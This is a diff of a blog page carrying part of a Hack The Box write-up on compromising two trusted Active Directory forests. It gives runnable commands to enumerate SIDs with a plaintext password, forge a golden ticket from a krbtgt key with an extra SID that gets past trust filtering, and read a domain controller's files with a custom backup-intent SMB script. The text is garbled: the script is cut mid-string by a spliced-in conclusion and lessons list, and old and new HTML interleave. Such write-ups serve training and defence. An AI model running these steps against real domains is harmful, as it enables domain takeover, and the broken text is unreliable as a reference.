+<p><img src="images/darkzero-23.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>pip install bloodhound --break-system-packages</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-24.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \
+  impacket-lookupsid 'darkzero.ext/josh:Rangers1@172.16.20.2' | head -5
+
+Domain SID is: S-1-5-21-2850783758-1231244658-2051857529</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-25.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \
+  impacket-lookupsid 'darkzero.ext/josh:Rangers1@172.16.20.1' 2&gt;&amp;1 | head -10
 
 Domain SID is: S-1-5-21-2899195410-1848524783-1547768515
 500: darkzero\Administrator (SidTypeUser)
 512: darkzero\Domain Admins (SidTypeGroup)
 ...
-1603: darkzero\Infrastructure Administrators (SidTypeGroup)   &amp;lt;-- high-RID custom group&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;group membership on DC01 via nxc ldap --groups&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-26.png&quot; alt=&quot;group membership on DC01 via nxc ldap --groups&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;group membership on DC01 via nxc ldap --groups&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q \
-  nxc ldap 172.16.20.1 -u josh -p &amp;#x27;Rangers1&amp;#x27; -d darkzero.ext --groups
+1603: darkzero\Infrastructure Administrators (SidTypeGroup)   &lt;-- high-RID custom group</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-26.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \
+  nxc ldap 172.16.20.1 -u josh -p 'Rangers1' -d darkzero.ext --groups
 
-Backup Operators   1 member   &amp;#x27;Backup Operators can override security restrictions for the sole purpose of backing up or restoring files&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;TREAT_AS_EXTERNAL filters most foreign SIDs at the trust boundary, but not uniformly — the custom, high-RID group Infrastructure Administrators (RID 1603) on the HTB-side forest is nested inside Backup Operators and survives the filter, carrying real privilege across the trust.&lt;/p&gt;&lt;h3&gt;Forging the cross-realm ticket&lt;/h3&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;impacket-ticketer forging a golden ticket carrying the extra high-RID SID&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-27.png&quot; alt=&quot;impacket-ticketer forging a golden ticket carrying the extra high-RID SID&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;impacket-ticketer forging a golden ticket carrying the extra high-RID SID&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;faketime &amp;#x27;+7 hours&amp;#x27; impacket-ticketer \
+Backup Operators   1 member   'Backup Operators can override security restrictions for the sole purpose of backing up or restoring files'</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>TREAT_AS_EXTERNAL filters most foreign SIDs at the trust boundary, but not uniformly — the custom, high-RID group Infrastructure Administrators (RID 1603) on the HTB-side forest is nested inside Backup Operators and survives the filter, carrying real privilege across the trust.</p>
+<h3 id="sec-11-forging-the-cross-realm-ticket">Forging the cross-realm ticket</h3>
+<p><img src="images/darkzero-27.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>faketime '+7 hours' impacket-ticketer \
   -aeskey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe \
   -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
   -domain darkzero.ext \
@@ -4078,15 +3382,11 @@ Backup Operators   1 member   &amp;#x27;Backup Operators can override security r
   -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
   Administrator
 
-# -aeskey is krbtgt&amp;#x27;s aes256 key, recovered from the STEP 9 secretsdump
+# -aeskey is krbtgt's aes256 key, recovered from the STEP 9 secretsdump
 # -extra-sid is the Infrastructure Administrators (Backup Operators) SID from DC01
-# -&amp;gt; Saving ticket in Administrator.ccache&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;dual-realm krb5.conf covering both forests&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-28.png&quot; alt=&quot;dual-realm krb5.conf covering both forests&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;dual-realm krb5.conf covering both forests&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;cat &amp;gt; /tmp/dzr-both.conf &amp;lt;&amp;lt;&amp;#x27;EOF&amp;#x27;
+# -&gt; Saving ticket in Administrator.ccache</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-28.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>cat &gt; /tmp/dzr-both.conf &lt;&lt;'EOF'
 [libdefaults]
     default_realm = DARKZERO.EXT
     dns_lookup_realm = false
@@ -4100,42 +3400,24 @@ Backup Operators   1 member   &amp;#x27;Backup Operators can override security r
 [domain_realm]
     darkzero.ext = DARKZERO.EXT
     darkzero.htb = DARKZERO.HTB
-EOF&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;pointing the environment at the dual-realm config and a shared cache&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-29.png&quot; alt=&quot;pointing the environment at the dual-realm config and a shared cache&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;pointing the environment at the dual-realm config and a shared cache&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;locating the forged ticket and requesting the cross-realm CIFS ticket&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-30.png&quot; alt=&quot;locating the forged ticket and requesting the cross-realm CIFS ticket&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;locating the forged ticket and requesting the cross-realm CIFS ticket&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;export KRB5_CONFIG=/tmp/dzr-both.conf
+EOF</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-29.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-30.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>export KRB5_CONFIG=/tmp/dzr-both.conf
 export KRB5CCNAME=/tmp/infraforge/combo.ccache
 
-find /tmp -iname &amp;#x27;Administrator.ccache&amp;#x27; 2&amp;gt;/dev/null
+find /tmp -iname 'Administrator.ccache' 2&gt;/dev/null
 mkdir -p /tmp/infraforge
 cp /tmp/Administrator.ccache /tmp/infraforge/combo.ccache
 
-faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
-cifs/dc01.darkzero.htb@DARKZERO.HTB: kvno = 4&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Requesting the SPN for DC01 while KRB5CCNAME points at the forged darkzero.ext ticket forces Kerberos to walk the cross-realm referral, producing a genuine cross-realm CIFS ticket for DC01 that still carries the forged Backup Operators membership.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s11&quot; data-num=&quot;11&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;11&lt;/span&gt;
-        &lt;h2&gt;Reading root.txt with backup semantics&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;Backup Operators isn&amp;#x27;t Domain Admin — an ordinary SMB read/list can still come back Access Denied. The privilege only activates when a client explicitly opens the file with FILE_OPEN_FOR_BACKUP_INTENT, which normal tools (including stock smbclient) don&amp;#x27;t set. A small custom script using impacket.smbconnection sets that flag directly:&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;the backup-intent SMB2 reader, and the root flag&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-31.png&quot; alt=&quot;the backup-intent SMB2 reader, and the root flag&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;the backup-intent SMB2 reader, and the root flag&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;cat &amp;gt; /tmp/smb_backup_read.py &amp;lt;&amp;lt;&amp;#x27;EOF&amp;#x27;
+faketime '+7 hours' proxychains4 -q kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
+cifs/dc01.darkzero.htb@DARKZERO.HTB: kvno = 4</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>Requesting the SPN for DC01 while KRB5CCNAME points at the forged darkzero.ext ticket forces Kerberos to walk the cross-realm referral, producing a genuine cross-realm CIFS ticket for DC01 that still carries the forged Backup Operators membership.</p>
+
+<p>11<br>        <br></p><h2 id="sec-12-reading-root-txt-with-backup-semantics">Reading root.txt with backup semantics</h2><p></p>
+<p>Backup Operators isn't Domain Admin — an ordinary SMB read/list can still come back Access Denied. The privilege only activates when a client explicitly opens the file with FILE_OPEN_FOR_BACKUP_INTENT, which normal tools (including stock smbclient) don't set. A small custom script using impacket.smbconnection sets that flag directly:</p>
+<p><img src="images/darkzero-31.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>cat &gt; /tmp/smb_backup_read.py &lt;&lt;'EOF'
 #!/usr/bin/env python3
 from impacket.smbconnection import SMBConnection
 from impacket.smb3structs import (
@@ -4147,11 +3429,22 @@ from impacket.smb3structs import (
 import sys
 
 host, path = sys.argv[1], sys.argv[2]
-smb = SMBConnection(host, &amp;#x27;172.16.20.1&amp;#x27;)
-smb.kerberosLogin(&amp;#x27;Administrator&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;DARKZERO.EXT&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;172.16.20.1&amp;#x27;)
+smb = SMBConnection(host, '172.16.20.1')
+smb.kerberosLogin('Administrator', '', 'DARKZERO.EXT', '', '', '', '172.16.20.1')
 
 raw = smb._SMBConnection
-tree_id = raw.connectTree(&amp;#x27;C$&amp;#x27;)
+tree_id = raw.connectTree('C<p></p>
+<p>root.txt, read straight off DC01 — full compromise of both forests: a forged golden ticket, a cross-realm CIFS ticket, and a raw SMB2 read with backup semantics.</p>
+
+<h2 id="sec-13-lessons-learned">Lessons Learned</h2>
+<ul><li>Escaping template output doesn't help if the attacker controls the compiler's input — the bug was accepting a pre-parsed AST at all.</li>
+<li>Read-only source access plus a CI runner is a privilege escalation primitive when the CI system trusts the operation, not the requester's rights.</li>
+<li>Windows path normalization is real attack surface — a string inert on Linux can collide with a protected path once Windows trims it.</li>
+<li>SeImpersonatePrivilege on a service account is basically SYSTEM waiting to happen.</li>
+<li>SID filtering across a forest trust is a spectrum — TREAT_AS_EXTERNAL changes which SIDs survive, and a custom group with a high RID is a legitimate way through.</li>
+<li>Backup Operators need backup semantics — the privilege is inert until a client explicitly asks for it via FILE_OPEN_FOR_BACKUP_INTENT.</li></ul>
+
+<p>Amine Ziani · Hack The Box: DarkZero Returns · Flags redacted per HTB policy</p>)
 file_id = raw.create(
     tree_id, path,
     FILE_READ_DATA | FILE_READ_ATTRIBUTES,
@@ -4163,183 +3456,18 @@ print(raw.read(tree_id, file_id, 0, 4096))
 raw.close(tree_id, file_id)
 EOF
 
-faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q python3 /tmp/smb_backup_read.py dc01.darkzero.htb &amp;#x27;\\Users\\Administrator\\Desktop\\root.txt&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;root.txt, read straight off DC01 — full compromise of both forests: a forged golden ticket, a cross-realm CIFS ticket, and a raw SMB2 read with backup semantics.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
+faketime '+7 hours' proxychains4 -q python3 /tmp/smb_backup_read.py dc01.darkzero.htb '\\Users\\Administrator\\Desktop\\root.txt'</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>root.txt, read straight off DC01 — full compromise of both forests: a forged golden ticket, a cross-realm CIFS ticket, and a raw SMB2 read with backup semantics.</p>
 
-    &lt;section class=&quot;lessons&quot;&gt;
-      &lt;h2 class=&quot;block-title&quot;&gt;Lessons Learned&lt;/h2&gt;
-      &lt;ul&gt;
-        &lt;li&gt;Escaping template output doesn&amp;#x27;t help if the attacker controls the compiler&amp;#x27;s input — the bug was accepting a pre-parsed AST at all.&lt;/li&gt;
-&lt;li&gt;Read-only source access plus a CI runner is a privilege escalation primitive when the CI system trusts the operation, not the requester&amp;#x27;s rights.&lt;/li&gt;
-&lt;li&gt;Windows path normalization is real attack surface — a string inert on Linux can collide with a protected path once Windows trims it.&lt;/li&gt;
-&lt;li&gt;SeImpersonatePrivilege on a service account is basically SYSTEM waiting to happen.&lt;/li&gt;
-&lt;li&gt;SID filtering across a forest trust is a spectrum — TREAT_AS_EXTERNAL changes which SIDs survive, and a custom group with a high RID is a legitimate way through.&lt;/li&gt;
-&lt;li&gt;Backup Operators need backup semantics — the privilege is inert until a client explicitly asks for it via FILE_OPEN_FOR_BACKUP_INTENT.&lt;/li&gt;
-      &lt;/ul&gt;
-    &lt;/section&gt;
+<h2 id="sec-14-lessons-learned">Lessons Learned</h2>
+<ul><li>Escaping template output doesn't help if the attacker controls the compiler's input — the bug was accepting a pre-parsed AST at all.</li>
+<li>Read-only source access plus a CI runner is a privilege escalation primitive when the CI system trusts the operation, not the requester's rights.</li>
+<li>Windows path normalization is real attack surface — a string inert on Linux can collide with a protected path once Windows trims it.</li>
+<li>SeImpersonatePrivilege on a service account is basically SYSTEM waiting to happen.</li>
+<li>SID filtering across a forest trust is a spectrum — TREAT_AS_EXTERNAL changes which SIDs survive, and a custom group with a high RID is a legitimate way through.</li>
+<li>Backup Operators need backup semantics — the privilege is inert until a client explicitly asks for it via FILE_OPEN_FOR_BACKUP_INTENT.</li></ul>
 
-    &lt;footer class=&quot;sig&quot;&gt;
-      Amine Ziani &amp;middot; Hack The Box: DarkZero Returns &amp;middot; &lt;span class=&quot;flag&quot;&gt;Flags redacted per HTB policy&lt;/span&gt;
-    &lt;/footer&gt;
-
-  &lt;/main&gt;
-&lt;/div&gt;
-
-&lt;script&gt;
-(function(){
-  // boot terminal typing effect
-  var lines = [
-    {p:&quot;josh@SRV01:~$ &quot;, t:&quot;cat attack_chain.log&quot;, d:35},
-    {p:&quot;&quot;, t:&quot;[+] 11 stages | 2 forests | 1 objective&quot;, d:14, cls:&quot;note&quot;},
-    {p:&quot;josh@SRV01:~$ &quot;, t:&quot;whoami&quot;, d:40},
-    {p:&quot;&quot;, t:&quot;NT AUTHORITY\\SYSTEM -&gt; darkzero\\Administrator&quot;, d:14, cls:&quot;note&quot;}
-  ];
-  var el = document.getElementById('bootTerm');
-  var li = 0, ci = 0;
-  function typeLine(){
-    if(li &gt;= lines.length){
-      var caret = document.createElement('span');
-      caret.className = 'caret';
-      el.appendChild(caret);
-      return;
-    }
-    var cfg = lines[li];
-    var div = document.createElement('div');
-    div.className = 'line';
-    var promptSpan = document.createElement('span');
-    promptSpan.className = 'prompt';
-    promptSpan.textContent = cfg.p;
-    div.appendChild(promptSpan);
-    var textNode = document.createTextNode('');
-    div.appendChild(textNode);
-    el.appendChild(div);
-    ci = 0;
-    (function step(){
-      if(ci &lt;= cfg.t.length){
-        textNode.textContent = cfg.t.slice(0, ci);
-        ci++;
-        setTimeout(step, cfg.d);
-      } else {
-        li++;
-        setTimeout(typeLine, 220);
-      }
-    })();
-  }
-  typeLine();
-
-  // scroll progress bar
-  var bar = document.getElementById('progressTop');
-  function onScroll(){
-    var h = document.documentElement;
-    var scrolled = (h.scrollTop) / (h.scrollHeight - h.clientHeight) * 100;
-    bar.style.width = scrolled + '%';
-  }
-  document.addEventListener('scroll', onScroll, {passive:true});
-  onScroll();
-
-  // rail node click -&gt; scroll to stage
-  var nodes = document.querySelectorAll('.rail-node');
-  nodes.forEach(function(n){
-    function go(){
-      var target = document.getElementById(n.getAttribute('data-target'));
-      if(target){ target.scrollIntoView({behavior:'smooth', block:'start'}); }
-    }
-    n.addEventListener('click', go);
-    n.addEventListener('keydown', function(e){ if(e.key==='Enter' || e.key===' '){ e.preventDefault(); go(); } });
-  });
-
-  // active stage tracking via IntersectionObserver
-  var stages = document.querySelectorAll('.stage');
-  var nodeMap = {};
-  nodes.forEach(function(n){ nodeMap[n.getAttribute('data-target')] = n; });
-
-  var order = Array.prototype.map.call(stages, function(s){ return s.id; });
-
-  var io = new IntersectionObserver(function(entries){
-    entries.forEach(function(entry){
-      if(entry.isIntersecting){
-        entry.target.classList.add('in-view');
-      }
-    });
-  }, {threshold:0.12});
-  stages.forEach(function(s){ io.observe(s); });
-
-  var activeIO = new IntersectionObserver(function(entries){
-    entries.forEach(function(entry){
-      var id = entry.target.id;
-      var idx = order.indexOf(id);
-      if(entry.isIntersecting){
-        order.forEach(function(oid, i){
-          var nd = nodeMap[oid];
-          if(!nd) return;
-          nd.classList.remove('active');
-          if(i &lt; idx) nd.classList.add('passed'); else nd.classList.remove('passed');
-        });
-        if(nodeMap[id]) nodeMap[id].classList.add('active');
-      }
-    });
-  }, {rootMargin:'-40% 0px -50% 0px', threshold:0});
-  stages.forEach(function(s){ activeIO.observe(s); });
-
-  // ---- lightbox: click a screenshot to zoom, click again (or controls) to dezoom ----
-  var lightbox = document.getElementById('lightbox');
-  var lbImg = document.getElementById('lightboxImg');
-  var lbCaption = document.getElementById('lightboxCaption');
-  var lbViewport = document.getElementById('lightboxViewport');
-  var lbZoomIn = document.getElementById('lbZoomIn');
-  var lbZoomOut = document.getElementById('lbZoomOut');
-  var lbClose = document.getElementById('lbClose');
-  var zoomLevel = 1;
-  var MIN_ZOOM = 1, MAX_ZOOM = 3, STEP = 0.4;
-
-  function applyZoom(){
-    lbImg.style.transform = 'scale(' + zoomLevel + ')';
-    lbImg.classList.toggle('zoomed', zoomLevel &gt; 1);
-  }
-  function zoomIn(){ zoomLevel = Math.min(MAX_ZOOM, +(zoomLevel + STEP).toFixed(2)); applyZoom(); }
-  function zoomOut(){ zoomLevel = Math.max(MIN_ZOOM, +(zoomLevel - STEP).toFixed(2)); applyZoom(); }
-
-  function openLightbox(src, caption){
-    lbImg.src = src;
-    lbImg.alt = caption || '';
-    lbCaption.textContent = caption || '';
-    zoomLevel = 1;
-    applyZoom();
-    lightbox.classList.add('open');
-    document.body.style.overflow = 'hidden';
-  }
-  function closeLightbox(){
-    lightbox.classList.remove('open');
-    document.body.style.overflow = '';
-    setTimeout(function(){ lbImg.src = ''; }, 250);
-  }
-
-  document.querySelectorAll('figure.shot .shot-frame img').forEach(function(img){
-    img.addEventListener('click', function(){
-      openLightbox(img.getAttribute('src'), img.getAttribute('alt'));
-    });
-  });
-
-  lbImg.addEventListener('click', function(e){
-    e.stopPropagation();
-    if(zoomLevel &gt; 1){ zoomLevel = 1; applyZoom(); } else { zoomIn(); }
-  });
-  lbZoomIn.addEventListener('click', function(e){ e.stopPropagation(); zoomIn(); });
-  lbZoomOut.addEventListener('click', function(e){ e.stopPropagation(); zoomOut(); });
-  lbClose.addEventListener('click', function(e){ e.stopPropagation(); closeLightbox(); });
-  lightbox.addEventListener('click', closeLightbox);
-  document.addEventListener('keydown', function(e){
-    if(!lightbox.classList.contains('open')) return;
-    if(e.key === 'Escape') closeLightbox();
-    if(e.key === '+' || e.key === '=') zoomIn();
-    if(e.key === '-') zoomOut();
-  });
-})();
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-" style="height: 16358px;"></iframe></div>
+<p>Amine Ziani · Hack The Box: DarkZero Returns · Flags redacted per HTB policy</p></div>
             <div class="pv-reactions" id="pvReactions">
                 <button class="react-btn like" id="likeBtn" onclick="reactToPost('like')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path></svg><span id="likeCount">0</span></button>
                 <button class="react-btn dislike" id="dislikeBtn" onclick="reactToPost('dislike')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3zM17 2h3a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-3"></path></svg><span id="dislikeCount">0</span></button>
@@ -4659,7 +3787,7 @@ faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q python3 /tmp/smb_backup_re
                     </div>
                 </div>
                 <!-- Notion Import Panel -->
-                <div id="notionPanel" style="display: block; background: var(--bg2); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 4px; padding: 1.5rem; margin-bottom: 1.5rem;">
+                <div id="notionPanel" style="display: none; background: var(--bg2); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 4px; padding: 1.5rem; margin-bottom: 1.5rem;">
                     <div style="font-family:var(--mono);font-size:.62rem;color:var(--accent2);letter-spacing:.2em;text-transform:uppercase;margin-bottom:.8rem">[ IMPORT_FROM_NOTION ]</div>
                     <div style="font-family:var(--sans);font-size:.8rem;color:var(--muted2);line-height:1.75;margin-bottom:1.2rem">
                         <strong style="color:var(--text)">How to export from Notion:</strong> Open your page → <strong style="color:var(--text)">···</strong> menu → <strong style="color:var(--text)">Export</strong> → choose <strong style="color:var(--text)">HTML</strong>. Notion gives you a ZIP file. Unzip it — you'll find an <code style="font-size:.75rem;background:var(--surface);padding:.1rem .35rem;border-radius:2px">.html</code> file and a folder of images.
@@ -4671,7 +3799,7 @@ faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q python3 /tmp/smb_backup_re
                         <div id="notionHtmlZone" onclick="document.getElementById('notionHtmlFileInput').click()" style="border: 2px dashed rgba(56, 189, 248, 0.35); border-radius: 4px; padding: 1.4rem 1.5rem; cursor: pointer; transition: border-color 0.2s, background 0.2s; background: var(--bg); text-align: center;" onmouseenter="this.style.borderColor='rgba(56,189,248,.7)';this.style.background='rgba(56,189,248,.04)'" onmouseleave="this.style.borderColor='rgba(56,189,248,.35)';this.style.background='var(--bg)'">
                             <div style="font-size:1.6rem;margin-bottom:.4rem">📄</div>
                             <div style="font-family:var(--mono);font-size:.7rem;color:var(--accent2)">Click to upload your Notion <strong>.html</strong> file</div>
-                            <div id="notionHtmlFileName" style="margin-top: 0.5rem; font-family: var(--mono); font-size: 0.62rem; color: var(--accent);">✓ DarkZero-Returns-Writeup.html loaded</div>
+                            <div id="notionHtmlFileName" style="margin-top: 0.5rem; font-family: var(--mono); font-size: 0.62rem;">No file selected</div>
                         </div>
                         <input type="file" id="notionHtmlFileInput" accept=".html,.htm,text/html" style="display:none" onchange="loadNotionHtmlFile(this)">
                     </div>
@@ -4736,16 +3864,6 @@ faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q python3 /tmp/smb_backup_re
                 </div>
 
                 <div class="admin-items" id="aBlogList">
-    <div class="admin-item">
-      <div class="ai-header">
-        <div><div class="ai-title">DarkZero Returns Writeup</div><div class="ai-meta">CTF · 30 Jul 2026 · <span style="color:var(--accent)">● Published</span></div></div>
-        <div class="ai-actions">
-          <button class="ico-btn" onclick="togglePublish('ms6pbj1fw2he03evnlb')" style="border-color:rgba(244,63,94,.4);color:var(--red)" title="Click to unpublish (hide from visitors)">Unpublish</button>
-          <button class="ico-btn" onclick="adminEditPost('ms6pbj1fw2he03evnlb')">Edit</button>
-          <button class="ico-btn del" onclick="delPost('ms6pbj1fw2he03evnlb')">Del</button>
-        </div>
-      </div>
-    </div>
     <div class="admin-item">
       <div class="ai-header">
         <div><div class="ai-title">Fireflow</div><div class="ai-meta">HTB · 23 Jul 2026 · <span style="color:var(--accent)">● Published</span></div></div>
@@ -5436,17 +4554,6 @@ nmap -sC -sV 10.10.10.x
             },
             "posts": [
                 {
-                    "id": "ms6pbj1fw2he03evnlb",
-                    "title": "DarkZero Returns Writeup",
-                    "category": "CTF",
-                    "tags": "",
-                    "excerpt": "josh@SRV01: ~",
-                    "content": "josh@SRV01: ~\n      \n    \n    \nHack The Box · Write-up\n\n    \n# DarkZero Returns\nDual-Forest Active Directory Compromise\n\n    \nUnauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests — an eleven-stage chain from AST injection to a raw SMB2 backup-intent read.\n\n    \n      Platform: **Hack The Box**\n      Difficulty: **Hard**\n      OS: **Windows (Linux foothold)**\n      Date: **26 Jul 2026**\n      Author: **Amine Ziani**\n    \n  \n  Scroll\n\n  \n    \n      screenshot\n      \n        −\n        +\n        ×\n      \n    \n    \n      \n    \n  \n\n  \n    Attack Chain / 11 Stages\n    \n      \n      01\n      \n        **Recon**\n        *virtual host discovery, dzcampaigns.htb*\n      \n    \n\n      02\n      \n        **Initial access**\n        *Handlebars AST injection (CVE-2026-58443) → RCE as darkzero*\n      \n    \n\n      03\n      \n        **Credential access**\n        *MySQL bcrypt hash cracked with hashcat, reused on domain account josh*\n      \n    \n\n      04\n      \n        **Pivoting**\n        *Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment*\n      \n    \n\n      05\n      \n        **Lateral movement**\n        *Kerberos/SPNEGO auth to an internal Gitea instance*\n      \n    \n\n      06\n      \n        **CI/CD privesc — round 1**\n        *reversed pull-request workflow trigger → shell as svc-runner*\n      \n    \n\n      07\n      \n        **CI/CD privesc — round 2**\n        *Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea*\n      \n    \n\n      08\n      \n        **Local privesc**\n        *GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\\SYSTEM*\n      \n    \n\n      09\n      \n        **Domain compromise**\n        *DCSync of darkzero.ext, blocked at the forest-trust boundary*\n      \n    \n\n      10\n      \n        **Cross-forest attack**\n        *SID-filtering bypass via a high-RID group nested in Backup Operators*\n      \n    \n\n      11\n      \n        **Objective**\n        *raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb*\n      \n    \n    \n  \n\n  \n\n    \n      \n## Document Overview\n\n      \n        \n          TL;DR\n          \nUnauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests. The chain runs through a Handlebars AST-injection RCE, a cracked database hash reused on a domain account, a Chisel reverse-tunnel pivot into a DNS-less internal segment, a CI/CD trust-confusion bug in Gitea (twice, via two different primitives), a local privilege escalation with GodPotato, a DCSync blocked at the forest-trust boundary, and finally a SID-filtering bypass across a 